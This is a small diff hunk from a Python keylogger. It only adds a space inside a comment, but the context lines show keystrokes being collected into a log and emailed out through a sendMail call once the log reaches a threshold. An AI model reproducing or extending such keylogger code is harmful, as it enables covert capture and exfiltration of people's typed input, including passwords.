@@ -52,7 +52,7 @@ def keystroke(key):
 
     #Keystrokes message sender
     if key not in numLet:
-        log+= '\n\n' f" {keyLog} \n {key} "   #'\n\n' works to ensure that the keystrokes show up as the message
+        log+= '\n\n' f" {keyLog} \n {key} "   # '\n\n' works to ensure that the keystrokes show up as the message
         keyLog = ""
         if len(log) >= char_length:
             sendMail(Email, password, log)
